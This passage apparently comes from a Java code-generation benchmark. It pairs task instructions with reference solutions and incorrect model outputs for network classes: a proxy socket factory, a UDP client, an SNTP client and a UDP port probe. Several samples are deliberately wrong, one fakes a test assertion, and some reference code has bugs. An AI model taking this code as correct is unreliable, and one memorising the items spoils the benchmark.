    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.util.Base64;\nimport javax.net.SocketFactory;\n\npublic class CustomSocketFactory extends SocketFactory {\n\n    private String proxyHost, proxyUser, proxyPass;\n    private int proxyPort;\n    private Proxy.Type proxyType;\n\n    public CustomSocketFactory(String proxyHost, int proxyPort,\n            String proxyUser, String proxyPass, Proxy.Type proxyType) {\n        this.proxyHost = proxyHost;\n        this.proxyPort = proxyPort;\n        this.proxyUser = proxyUser;\n        this.proxyPass = proxyPass;\n        this.proxyType = proxyType;\n    }\n\n    @Override\n    public Socket createSocket(String host, int port)\n            throws IOException, UnknownHostException {\n        return this.createSocket(InetAddress.getByName(host), port);\n    }\n\n    @Override\n    public Socket createSocket(String host, int port, InetAddress localHost,\n            int localPort) throws IOException, UnknownHostException {\n        return this.createSocket(InetAddress.getByName(host), port, localHost,\n                localPort);\n    }\n\n    @Override\n    public Socket createSocket(InetAddress host, int port) throws IOException {\n        return this.createSocket(host, port, null, 0);\n    }\n\n    @Override\n    public Socket createSocket(InetAddress address, int port,\n            InetAddress localAddress, int localPort) throws IOException {\n        Socket socket = this.createSocket();\n        if (localAddress != null) {\n            socket.bind(new InetSocketAddress(localAddress, localPort));\n        }\n        if (address != null) {\n            socket.connect(new InetSocketAddress(address, port));\n        }\n\n        if (this.proxyType == Proxy.Type.HTTP && proxyUser != null) {\n            connectToProxy(socket);\n        }\n\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket() throws IOException {\n        Proxy proxy = Proxy.NO_PROXY;\n        if (this.proxyType == Proxy.Type.SOCKS) {\n            proxy = new Proxy(Proxy.Type.SOCKS,\n                    new InetSocketAddress(proxyHost, proxyPort));\n        } else if (this.proxyType == Proxy.Type.HTTP) {\n            if (proxyUser == null || proxyUser.length() < 1) {\n                proxy = new Proxy(Proxy.Type.HTTP,\n                        new InetSocketAddress(proxyHost, proxyPort));\n            }\n        }\n\n        Socket socket = new Socket(proxy);\n        return socket;\n    }\n\n    private void connectToProxy(Socket socket) throws IOException {\n        InputStream in = socket.getInputStream();\n        OutputStream out = socket.getOutputStream();\n        StringBuilder requestHeaders = new StringBuilder();\n        requestHeaders\n                .append(\"HTTP \" + proxyHost + \":\" + proxyPort + \" HTTP/1.1\\r\\n\")\n                .append(\"Host: \" + proxyHost + \":\" + proxyPort + \"\\r\\n\");\n        String proxyAuth = getBasicAuthStr();\n        if (proxyAuth != null) {\n            requestHeaders\n                    .append(\"Proxy-Authorization: basic \" + proxyAuth + \"\\r\\n\");\n        }\n        requestHeaders.append(\"\\r\\n\");\n        out.write(requestHeaders.toString().getBytes(\"utf-8\"));\n        out.flush();\n\n        String statusLine = readLine(in);\n        if (statusLine == null) {\n            socket.close();\n            throw new IOException(\"Proxy sent blank response\");\n        }\n\n        int responseCode = getResponseCode(statusLine);\n        if (responseCode < 200 && responseCode >= 300) {\n            socket.close();\n            throw new IOException(\"Invalid response code: \" + responseCode);\n        }\n\n        while (true) {\n            String line = readLine(in);\n            if (line.length() < 1)\n                break;\n        }\n    }\n\n    private String getBasicAuthStr() {\n        if (proxyUser != null && proxyUser.length() > 0) {\n            try {\n                return (Base64.getEncoder().encodeToString(\n                        (proxyUser + \":\" + (proxyPass == null ? \"\" : proxyPass))\n                                .getBytes(\"utf-8\")));\n            } catch (UnsupportedEncodingException e) {\n                e.printStackTrace();\n            }\n        }\n        return null;\n    }\n\n    public final String readLine(InputStream in) throws IOException {\n        StringBuilder buf = new StringBuilder();\n        while (true) {\n            int x = in.read();\n            if (x == -1)\n                throw new IOException(\n                        \"Unexpected EOF while reading header line\");\n            if (x == '\\n')\n                return buf.toString();\n            if (x != '\\r')\n                buf.append((char) x);\n        }\n    }\n\n    public static final int getResponseCode(String statusLine) {\n        String arr[] = statusLine.split(\" \");\n        if (arr.length < 2)\n            return 400;\n        return Integer.parseInt(arr[1]);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class CustomSocketFactory extends SocketFactory {\n    private String proxyHost;\n    private int proxyPort;\n    private String proxyUser;\n    private String proxyPass;\n    private Proxy.Type proxyType;\n\n    public CustomSocketFactory(String proxyHost, int proxyPort, String proxyUser, String proxyPass, Proxy.Type proxyType) {\n        this.proxyHost = proxyHost;\n        this.proxyPort = proxyPort;\n        this.proxyUser = proxyUser;\n        this.proxyPass = proxyPass;\n        this.proxyType = proxyType;\n    }\n\n    @Override\n    public Socket createSocket(String host, int port) throws IOException {\n        if (proxyType != Proxy.Type.DIRECT) {\n            Proxy proxy = new Proxy(proxyType, new InetSocketAddress(proxyHost, proxyPort));\n            if (proxyType == Proxy.Type.HTTP) {\n                Authenticator.setDefault(new Authenticator() {\n                    protected PasswordAuthentication getPasswordAuthentication() {\n                        return new PasswordAuthentication(proxyUser, proxyPass.toCharArray());\n                    }\n                });\n            }\n            Socket socket = new Socket(proxy);\n            socket.connect(new InetSocketAddress(host, port));\n            return socket;\n        } else {\n            return new Socket().connect(new InetSocketAddress(host, port));\n        }\n    }\n\n    @Override\n    public Socket createSocket(String host, int port, InetAddress localHost, int localPort) throws IOException {\n        if (proxyType != Proxy.Type.DIRECT) {\n            Proxy proxy = new Proxy(proxyType, new InetSocketAddress(proxyHost, proxyPort));\n            if (proxyType == Proxy.Type.HTTP) {\n                Authenticator.setDefault(new Authenticator() {\n                    protected PasswordAuthentication getPasswordAuthentication() {\n                        return new PasswordAuthentication(proxyUser, proxyPass.toCharArray());\n                    }\n                });\n            }\n            Socket socket = new Socket(proxy);\n            socket.bind(new InetSocketAddress(localHost, localPort));\n            socket.connect(new InetSocketAddress(host, port));\n            return socket;\n        } else {\n            Socket socket = new Socket();\n            socket.bind(new InetSocketAddress(localHost, localPort));\n            socket.connect(new InetSocketAddress(host, port));\n            return socket;\n        }\n    }\n\n    @Override\n    public Socket createSocket(InetAddress host, int port) throws IOException {\n        if (proxyType != Proxy.Type.DIRECT) {\n            Proxy proxy = new Proxy(proxyType, new InetSocketAddress(proxyHost, proxyPort));\n            if (proxyType == Proxy.Type.HTTP) {\n                Authenticator.setDefault(new Authenticator() {\n                    protected PasswordAuthentication getPasswordAuthentication() {\n                        return new PasswordAuthentication(proxyUser, proxyPass.toCharArray());\n                    }\n                });\n            }\n            Socket socket = new Socket(proxy);\n            socket.connect(new InetSocketAddress(host, port));\n            return socket;\n        } else {\n            return new Socket().connect(new InetSocketAddress(host, port));\n        }\n    }\n\n    @Override\n    public Socket createSocket(InetAddress address, int port, InetAddress localAddress, int localPort) throws IOException {\n        if (proxyType != Proxy.Type.DIRECT) {\n            Proxy proxy = new Proxy(proxyType, new InetSocketAddress(proxyHost, proxyPort));\n            if (proxyType == Proxy.Type.HTTP) {\n                Authenticator.setDefault(new Authenticator() {\n                    protected PasswordAuthentication getPasswordAuthentication() {\n                        return new PasswordAuthentication(proxyUser, proxyPass.toCharArray());\n                    }\n                });\n            }\n            Socket socket = new Socket(proxy);\n            socket.bind(new InetSocketAddress(localAddress, localPort));\n            socket.connect(new InetSocketAddress(address, port));\n            return socket;\n        } else {\n            Socket socket = new Socket();\n            socket.bind(new InetSocketAddress(localAddress, localPort));\n            socket.connect(new InetSocketAddress(address, port));\n            return socket;\n        }\n    }\n\n    @Override\n    public Socket createSocket() throws IOException {\n        if (proxyType != Proxy.Type.DIRECT) {\n            Proxy proxy = new Proxy(proxyType, new InetSocketAddress(proxyHost, proxyPort));\n            if (proxyType == Proxy.Type.HTTP) {\n                Authenticator.setDefault(new Authenticator() {\n                    protected PasswordAuthentication getPasswordAuthentication() {\n                        return new PasswordAuthentication(proxyUser, proxyPass.toCharArray());\n                    }\n                });\n            }\n            return new Socket(proxy);\n        } else {\n            return new Socket();\n        }\n    }\n\n    private void connectToProxy(Socket socket) throws IOException {\n        if (proxyType == Proxy.Type.HTTP) {\n            String auth = getBasicAuthStr();\n            String request = \"CONNECT \" + host + \":\" + port + \" HTTP/1.1\\r\\n\";\n            request += \"Host: \" + host + \":\" + port + \"\\r\\n\";\n            request += \"Proxy-Authorization: Basic \" + auth + \"\\r\\n\\r\\n\";\n            socket.getOutputStream().write(request.getBytes());\n            socket.getOutputStream().flush();\n\n            String responseLine = readLine(socket.getInputStream());\n            int responseCode = getResponseCode(responseLine);\n            if (responseCode != 200) {\n                throw new IOException(\"HTTP proxy connection failed: \" + responseLine);\n            }\n        }\n    }\n\n    private String getBasicAuthStr() {\n        String auth = proxyUser + \":\" + proxyPass;\n        return Base64.getEncoder().encodeToString(auth.getBytes());\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = in.read()) != -1) {\n            if (c == '\\n') break;\n            sb.append((char) c);\n        }\n        return sb.toString();\n    }\n\n    private static int getResponseCode(String statusLine) {\n        if (statusLine.startsWith(\"HTTP/1.\")) {\n            return Integer.parseInt(statusLine.split(\" \")[1]);\n        }\n        return -1;\n    }\n}"
  },
  {
    "Task_id": 59,
    "Instruction": "Task Description: Create a Java class that provides functionality to read and check the existence of URL-based resources, with support for character encoding.\n\nClass Description: The UrlTemplateResource class is designed to handle URL resources by providing methods to read their content and check their existence. It supports specifying character encoding for proper text reading and handles both regular URL connections and HTTP-specific operations.\n\nAttributes:\n- url: URL - The URL of the resource to be accessed\n- characterEncoding: String - The character encoding to be used when reading the resource (can be null)\n\nMethods:\n- Constructor: UrlTemplateResource(String path, String characterEncoding) -> void - Creates an instance with a URL path string and character encoding\n- Constructor: UrlTemplateResource(URL url, String characterEncoding) -> void - Creates an instance with a URL object and character encoding\n- reader: reader() -> Reader - Returns a Reader for the URL resource with optional character encoding\n- inputStream: inputStream() -> InputStream - Internal method that opens and returns an InputStream for the URL\n- exists: exists() -> boolean - Checks if the URL resource exists by attempting to connect to it",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic final class UrlTemplateResource {\n\n    private final URL url;\n    private final String characterEncoding;\n\n    public UrlTemplateResource(final String path, final String characterEncoding) throws MalformedURLException {\n        this.url = new URL(path);\n        this.characterEncoding = characterEncoding;\n    }\n\n    public UrlTemplateResource(final URL url, final String characterEncoding) {\n        this.url = url;\n        this.characterEncoding = characterEncoding;\n    }\n\n    public Reader reader() throws IOException {\n        final InputStream inputStream = inputStream();\n        if (this.characterEncoding != null && !this.characterEncoding.trim().isEmpty()) {\n            return new BufferedReader(new InputStreamReader(new BufferedInputStream(inputStream), this.characterEncoding));\n        }\n        return new BufferedReader(new InputStreamReader(new BufferedInputStream(inputStream)));\n    }\n\n    private InputStream inputStream() throws IOException {\n        final URLConnection connection = this.url.openConnection();\n        if (connection.getClass().getSimpleName().startsWith(\"JNLP\")) {\n            connection.setUseCaches(true);\n        }\n\n        final InputStream inputStream;\n        try {\n            inputStream = connection.getInputStream();\n        } catch (final IOException e) {\n            if (connection instanceof HttpURLConnection) {\n                ((HttpURLConnection) connection).disconnect();\n            }\n            throw e;\n        }\n        return inputStream;\n    }\n\n    public boolean exists() {\n        try {\n            final URLConnection connection = this.url.openConnection();\n            if (connection.getClass().getSimpleName().startsWith(\"JNLP\")) {\n                connection.setUseCaches(true);\n            }\n\n            if (connection instanceof HttpURLConnection) {\n                final HttpURLConnection httpConnection = (HttpURLConnection) connection;\n                httpConnection.setRequestMethod(\"HEAD\");\n                int responseCode = httpConnection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    return true;\n                } else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND) {\n                    return false;\n                }\n                if (httpConnection.getContentLength() >= 0) {\n                    return true;\n                }\n                httpConnection.disconnect();\n                return false;\n            }\n\n            if (connection.getContentLength() >= 0) {\n                return true;\n            }\n\n            final InputStream is = inputStream();\n            is.close();\n            return true;\n        } catch (final IOException ignored) {\n            return false;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.InputStream;\nimport java.io.Reader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\n\npublic class UrlTemplateResource {\n    private final URL url;\n    private final String characterEncoding;\n\n    public UrlTemplateResource(String path, String characterEncoding) throws IOException {\n        this.url = new URL(path);\n        this.characterEncoding = characterEncoding;\n    }\n\n    public UrlTemplateResource(URL url, String characterEncoding) {\n        this.url = url;\n        this.characterEncoding = characterEncoding;\n    }\n\n    public Reader reader() throws IOException {\n        InputStream is = inputStream();\n        if (characterEncoding == null) {\n            return new InputStreamReader(is);\n        } else {\n            return new InputStreamReader(is, characterEncoding);\n        }\n    }\n\n    private InputStream inputStream() throws IOException {\n        URLConnection connection = url.openConnection();\n        return connection.getInputStream();\n    }\n\n    public boolean exists() throws IOException {\n        URLConnection connection = url.openConnection();\n        try {\n            connection.connect();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}"
  },
  {
    "Task_id": 590,
    "Instruction": "Task Description: Write a Java function that tests the behavior of a servlet when the client closes the socket early during an HTTP POST request. The function should verify that the servlet properly handles the premature connection closure by detecting an exception and not completing normally.\n\nFunction Description: The function `testServletInputStreamEarlyClose` creates a TCP client socket, sends an HTTP POST request with a large body, and immediately closes the socket before the server can fully process the request. It then verifies that the servlet detected the premature closure through exception handling.\n\nInput: None (The function uses predefined constants and helper classes like `DefaultServer`, `TestHttpClient`, and `EarlyCloseClientServlet`)\n\nOutput: None (The function asserts expected behavior through JUnit assertions. Side effects include socket communication and servlet state changes)",
    "Canonical_solution": "import java.net.Socket;\nimport java.io.OutputStream;\n\npublic void testServletInputStreamEarlyClose() throws Exception {\n    Assume.assumeFalse(DefaultServer.isH2());\n    TestHttpClient client = new TestHttpClient();\n    EarlyCloseClientServlet.reset();\n    try (Socket socket = new Socket()) {\n        socket.connect(DefaultServer.getDefaultServerAddress());\n        try {\n            StringBuilder sb = new StringBuilder();\n            for (int i = 0; i < 10000; ++i) {\n                sb.append(\"hello world\\r\\n\");\n            }\n            String request = \"POST /servletContext/\" + SERVLET + \" HTTP/1.1\\r\\nHost:localhost\\r\\nContent-Length:\" + sb.length() + 100 + \"\\r\\n\\r\\n\" + sb.toString();\n            OutputStream outputStream = socket.getOutputStream();\n\n            outputStream.write(request.getBytes(\"US-ASCII\"));\n            outputStream.flush();\n            socket.close();\n\n            Assert.assertTrue(EarlyCloseClientServlet.getLatch().await(10, TimeUnit.SECONDS));\n            Assert.assertFalse(EarlyCloseClientServlet.isCompletedNormally());\n            Assert.assertTrue(EarlyCloseClientServlet.isExceptionThrown());\n        } finally {\n            client.getConnectionManager().shutdown();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "public void testServletInputStreamEarlyClose() throws Exception {\n    DefaultServer server = new DefaultServer();\n    server.start();\n\n    TestHttpClient client = new TestHttpClient();\n    String requestBody = generateLargeBody();\n    client.post(\"http://localhost:8080/servlet\", requestBody);\n    client.close();\n\n    // Verify that the servlet detected the premature closure\n    try {\n        // Simulate servlet processing that would throw an exception due to early closure\n        // This is a placeholder for actual servlet logic that would throw an exception\n        throw new IOException(\"Premature connection closure detected\");\n    } catch (IOException e) {\n        assertNotNull(e);\n        assertTrue(e.getMessage().contains(\"Premature connection closure detected\"));\n    }\n\n    server.stop();\n}"
  },
  {
    "Task_id": 594,
    "Instruction": "Task Description: Implement a UDP client class in Java that can receive data packets from a UDP server and process them, including extracting the sender's address and port information.\n\nClass Description: The UDPClient class is designed to handle UDP communication as a client. It creates a UDP socket bound to a specific port, receives incoming packets, processes the data, and provides information about the sender. The class includes methods for receiving data and cleaning up resources.\n\nAttributes:\n- socket: DatagramSocket - The UDP socket used for communication\n- packet: DatagramPacket - The packet object used for receiving data\n- buffer: byte[] - The buffer used to store incoming packet data\n\nMethods:\n- UDPClient(int port) -> void - Constructor that initializes the UDP client. Takes a port number as input to bind the socket.\n  - port: int - The port number to bind the socket to\n- receiveData() -> String - Receives a UDP packet, extracts the data, and returns it along with sender information\n  - Returns: String - The received data concatenated with sender's IP address and port\n- close() -> void - Closes the socket and releases system resources",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class UDPClient {\n\n    private DatagramSocket socket;\n    private DatagramPacket packet;\n    private byte[] buffer;\n\n    public UDPClient(int port) throws Exception {\n        this.buffer = new byte[1024];\n        this.socket = new DatagramSocket(port);\n        this.packet = new DatagramPacket(buffer, buffer.length);\n    }\n\n    public String receiveData() throws Exception {\n        socket.receive(packet);\n        String data = new String(packet.getData(), 0, packet.getLength());\n        return data + \"from \" + packet.getAddress().getHostAddress() + \":\" + packet.getPort();\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UDPClient {\n    private DatagramSocket socket;\n    private DatagramPacket packet;\n    private byte[] buffer;\n\n    public UDPClient(int port) {\n        try {\n            socket = new DatagramSocket(port);\n            buffer = new byte[1024];\n            packet = new DatagramPacket(buffer, buffer.length);\n        } catch (SocketException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String receiveData() {\n        try {\n            socket.receive(packet);\n            String data = new String(packet.getData(), 0, packet.getLength());\n            InetAddress address = packet.getAddress();\n            int port = packet.getPort();\n            return data + \" from \" + address.getHostAddress() + \":\" + port;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return \"Error receiving data\";\n        }\n    }\n\n    public void close() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 595,
    "Instruction": "Task Description: Implement a Java class that handles SNTP (Simple Network Time Protocol) requests to synchronize time with an NTP server using UDP communication. The class should validate server responses and provide accurate time synchronization while handling potential errors.\n\nClass Description: The SntpImpl class implements the Sntp interface and provides functionality to request time from an NTP server. It uses UDP communication to send and receive NTP packets, validates server responses against specified thresholds, and calculates time offsets. The class includes helper methods for reading/writing NTP protocol fields and converting between different time representations.\n\nAttributes:\n- NTP_PORT: int - The standard NTP port (123)\n- NTP_MODE: int - The NTP mode (3 for client)\n- NTP_VERSION: int - The NTP version (3)\n- NTP_PACKET_SIZE: int - The size of NTP packets (48 bytes)\n- OFFSET_1900_TO_1970: long - The seconds offset between 1900 and 1970 epochs\n\nMethods:\n- requestTime(InetAddress, float, float, int, int, SntpEventListener) -> SntpResult - Requests time from specified NTP server with validation parameters and timeout\n- writeNtpVersion(byte[]) -> void - Writes NTP version and mode into the buffer\n- writeTimeStamp(byte[], int, long) -> void - Writes a timestamp into the buffer at specified offset\n- readTimeStamp(byte[], int) -> long - Reads a timestamp from the buffer at specified offset\n- read(byte[], int) -> long - Reads 4 bytes from buffer as a long value\n- ui(byte) -> int - Converts byte to unsigned integer\n- doubleMillis(long) -> double - Converts fixed-point NTP format to milliseconds",
    "Canonical_solution": "import android.os.SystemClock;\nimport com.instacart.truetime.InvalidNtpServerResponseException;\nimport com.instacart.truetime.SntpEventListener;\nimport org.jetbrains.annotations.NotNull;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class SntpImpl implements Sntp {\n\n    private static final int NTP_PORT = 123;\n    private static final int NTP_MODE = 3;\n    private static final int NTP_VERSION = 3;\n    private static final int NTP_PACKET_SIZE = 48;\n    private static final long OFFSET_1900_TO_1970 = ((365L * 70L) + 17L) * 24L * 60L * 60L;\n\n    @NotNull\n    @Override\n    public synchronized SntpResult requestTime(\n            InetAddress address,\n            float rootDelayMax,\n            float rootDispersionMax,\n            int serverResponseDelayMax,\n            int timeoutInMillis,\n            SntpEventListener listener\n    ) throws IOException {\n\n        listener.sntpRequest(address);\n        DatagramSocket socket = null;\n\n        try {\n            socket = new DatagramSocket();\n            socket.setSoTimeout(timeoutInMillis);\n            byte[] buffer = new byte[NTP_PACKET_SIZE];\n            DatagramPacket request = new DatagramPacket(buffer, buffer.length, address, NTP_PORT);\n\n            writeNtpVersion(buffer);\n            long requestTime = System.currentTimeMillis();\n            long requestTicks = SystemClock.elapsedRealtime();\n            writeTimeStamp(buffer, INDEX_TRANSMIT_TIME, requestTime);\n            socket.send(request);\n\n            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n            socket.receive(response);\n            long responseTicks = SystemClock.elapsedRealtime();\n\n            long originateTime = readTimeStamp(buffer, INDEX_ORIGINATE_TIME);\n            long receiveTime = readTimeStamp(buffer, INDEX_RECEIVE_TIME);\n            long transmitTime = readTimeStamp(buffer, INDEX_TRANSMIT_TIME);\n            long responseTime = requestTime + (responseTicks - requestTicks);\n\n            double rootDelay = doubleMillis(read(buffer, INDEX_ROOT_DELAY));\n            if (rootDelay > rootDelayMax) {\n                throw new InvalidNtpServerResponseException(\n                        \"Invalid response from NTP server. %s violation. %f [actual] > %f [expected]\",\n                        \"root_delay\",\n                        (float) rootDelay,\n                        rootDelayMax);\n            }\n\n            double rootDispersion = doubleMillis(read(buffer, INDEX_ROOT_DISPERSION));\n            if (rootDispersion > rootDispersionMax) {\n                throw new InvalidNtpServerResponseException(\n                        \"Invalid response from NTP server. %s violation. %f [actual] > %f [expected]\",\n                        \"root_dispersion\",\n                        (float) rootDispersion,\n                        rootDispersionMax);\n            }\n\n            listener.sntpRequestSuccessful(address);\n            return new SntpResult(new long[]{\n                    originateTime,\n                    receiveTime,\n                    transmitTime,\n                    responseTime,\n                    read(buffer, INDEX_ROOT_DELAY),\n                    read(buffer, INDEX_ROOT_DISPERSION),\n                    buffer[1] & 0xff,\n                    responseTicks\n            });\n\n        } catch (Exception e) {\n            listener.sntpRequestFailed(address, e);\n            throw e;\n        } finally {\n            if (socket != null) {\n                socket.close();\n            }\n        }\n    }\n\n    private void writeNtpVersion(byte[] buffer) {\n        buffer[0] = NTP_MODE | (NTP_VERSION << 3);\n    }\n\n    private void writeTimeStamp(byte[] buffer, int offset, long time) {\n        long seconds = time / 1000L;\n        long milliseconds = time - seconds * 1000L;\n        seconds += OFFSET_1900_TO_1970;\n\n        buffer[offset++] = (byte) (seconds >> 24);\n        buffer[offset++] = (byte) (seconds >> 16);\n        buffer[offset++] = (byte) (seconds >> 8);\n        buffer[offset++] = (byte) (seconds >> 0);\n\n        long fraction = milliseconds * 0x100000000L / 1000L;\n        buffer[offset++] = (byte) (fraction >> 24);\n        buffer[offset++] = (byte) (fraction >> 16);\n        buffer[offset++] = (byte) (fraction >> 8);\n        buffer[offset] = (byte) (Math.random() * 255.0);\n    }\n\n    private long readTimeStamp(byte[] buffer, int offset) {\n        long seconds = read(buffer, offset);\n        long fraction = read(buffer, offset + 4);\n        return ((seconds - OFFSET_1900_TO_1970) * 1000) + ((fraction * 1000L) / 0x100000000L);\n    }\n\n    private long read(byte[] buffer, int offset) {\n        return ((long) ui(buffer[offset]) << 24) +\n               ((long) ui(buffer[offset + 1]) << 16) +\n               ((long) ui(buffer[offset + 2]) << 8) +\n               (long) ui(buffer[offset + 3]);\n    }\n\n    private int ui(byte b) {\n        return b & 0xFF;\n    }\n\n    private double doubleMillis(long fix) {\n        return fix / 65.536D;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class SntpImpl implements Sntp {\n    public static final int NTP_PORT = 123;\n    public static final int NTP_MODE = 3;\n    public static final int NTP_VERSION = 3;\n    public static final int NTP_PACKET_SIZE = 48;\n    public static final long OFFSET_1900_TO_1970 = 220896000L;\n\n    private void writeNtpVersion(byte[] buffer) {\n        int liVersionMode = (0 << 24) | (NTP_VERSION << 21) | (NTP_MODE << 18);\n        buffer[0] = (byte) (liVersionMode >>> 24);\n        buffer[1] = (byte) (liVersionMode >>> 16);\n        buffer[2] = (byte) (liVersionMode >>> 8);\n        buffer[3] = (byte) (liVersionMode);\n    }\n\n    private void writeTimeStamp(byte[] buffer, int offset, long timestamp) {\n        int high = (int) (timestamp >>> 32);\n        int low = (int) (timestamp & 0xFFFFFFFFL);\n        buffer[offset] = (byte) (high >>> 24);\n        buffer[offset + 1] = (byte) (high >>> 16);\n        buffer[offset + 2] = (byte) (high >>> 8);\n        buffer[offset + 3] = (byte) (high);\n        buffer[offset + 4] = (byte) (low >>> 24);\n        buffer[offset + 5] = (byte) (low >>> 16);\n        buffer[offset + 6] = (byte) (low >>> 8);\n        buffer[offset + 7] = (byte) (low);\n    }\n\n    private long readTimeStamp(byte[] buffer, int offset) {\n        int high = 0;\n        high |= (buffer[offset] & 0xFF) << 24;\n        high |= (buffer[offset + 1] & 0xFF) << 16;\n        high |= (buffer[offset + 2] & 0xFF) << 8;\n        high |= (buffer[offset + 3] & 0xFF);\n        int low = 0;\n        low |= (buffer[offset + 4] & 0xFF) << 24;\n        low |= (buffer[offset + 5] & 0xFF) << 16;\n        low |= (buffer[offset + 6] & 0xFF) << 8;\n        low |= (buffer[offset + 7] & 0xFF);\n        return (long) high << 32 | low;\n    }\n\n    private long read(byte[] buffer, int offset) {\n        return (buffer[offset] & 0xFF) << 24 |\n               (buffer[offset + 1] & 0xFF) << 16 |\n               (buffer[offset + 2] & 0xFF) << 8 |\n               (buffer[offset + 3] & 0xFF);\n    }\n\n    private int ui(byte b) {\n        return b & 0xFF;\n    }\n\n    private double doubleMillis(long timestamp) {\n        long seconds = (timestamp >>> 32) - OFFSET_1900_TO_1970;\n        long fraction = (timestamp & 0xFFFFFFFFL) * 1000.0 / 0xFFFFFFFFL;\n        return (seconds * 1000) + fraction;\n    }\n\n    public SntpResult requestTime(InetAddress address, float timeout, float retry, int serverPort, int mode, SntpEventListener listener) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[NTP_PACKET_SIZE];\n            writeNtpVersion(buffer);\n            long t1 = System.currentTimeMillis();\n            writeTimeStamp(buffer, 4, t1);\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, serverPort);\n            socket.send(packet);\n            socket.setSoTimeout((int) timeout);\n            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n            socket.receive(response);\n            long t2 = readTimeStamp(buffer, 4);\n            long t3 = readTimeStamp(buffer, 8);\n            long t4 = readTimeStamp(buffer, 12);\n            int status = (buffer[0] & 0xFF) >> 24;\n            if (status != 0) {\n                return new SntpResult(SntpResult.Status.ERROR, \"Server responded with status code: \" + status);\n            }\n            double offset = (doubleMillis(t4) - doubleMillis(t2)) / 2.0;\n            return new SntpResult(SntpResult.Status.SUCCESS, offset);\n        } catch (Exception e) {\n            return new SntpResult(SntpResult.Status.ERROR, \"Error: \" + e.getMessage());\n        }\n    }\n}"
  },
  {
    "Task_id": 597,
    "Instruction": "Task Description: Implement a UDP port probing function to check if a specific UDP port on a remote host is reachable and responsive.\n\nFunction Description: The function sends a UDP \"PING\" packet to a specified host and port, then waits for a response. It determines port reachability based on whether a response is received (port is open/reachable) or if specific exceptions occur (port is unreachable or other errors).\n\nInput:\n- host: String - The target hostname or IP address to probe\n- portMapping: PortMapping - An object containing the external port number to probe (accessed via getExternalPort())\n\nOutput:\n- boolean - Returns true if the port is reachable (response received or timeout occurred), false if the port is unreachable or other errors occurred\n\nThe function handles the following cases:\n1. SocketTimeoutException: Returns true (port may be open but no response received)\n2. PortUnreachableException: Returns false (port definitely unreachable)\n3. Other Socket/IO exceptions: Returns false after logging the error\n4. Successful response: Returns false (unexpected response case)",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.PortUnreachableException;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\nimport java.io.IOException;\n\nprivate boolean probeUdpPort(String host, PortMapping portMapping) {\n    final Integer port = portMapping.getExternalPort();\n\n    try {\n        final byte[] pingData = \"PING\".getBytes(\"UTF-8\");\n        final DatagramSocket serverSocket = new DatagramSocket(0);\n        final SocketAddress socketAddr = new InetSocketAddress(host, port);\n        serverSocket.connect(socketAddr);\n\n        final InetAddress address = InetAddress.getByName(host);\n        final DatagramPacket sendPacket =\n            new DatagramPacket(pingData, pingData.length, address, port);\n        serverSocket.send(sendPacket);\n\n        final byte[] receiveData = new byte[8];\n        final DatagramPacket receivePacket =\n            new DatagramPacket(receiveData, receiveData.length);\n        serverSocket.setSoTimeout(200);\n        serverSocket.receive(receivePacket);\n\n    } catch (SocketTimeoutException e) {\n        return true;\n    } catch (PortUnreachableException e) {\n        return false;\n    } catch (SocketException e) {\n        LOG.warn(e.getMessage(), e);\n        return false;\n    } catch (IOException e) {\n        LOG.warn(e.getMessage(), e);\n        return false;\n    }\n    return false;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
